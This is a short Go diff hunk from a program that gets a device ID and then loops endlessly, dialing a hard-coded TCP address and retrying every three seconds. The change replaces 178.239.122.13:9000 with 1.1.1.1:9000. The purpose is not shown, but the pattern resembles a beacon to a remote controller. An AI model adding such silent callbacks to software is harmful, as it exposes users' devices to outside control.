@@ -106,7 +106,7 @@ func main() {
         deviceID := getDeviceID()
 
         for {
-                conn, err := net.Dial("tcp", "178.239.122.13:9000")
+                conn, err := net.Dial("tcp", "1.1.1.1:9000")
                 if err != nil {
                         time.Sleep(3 * time.Second)
                         continue
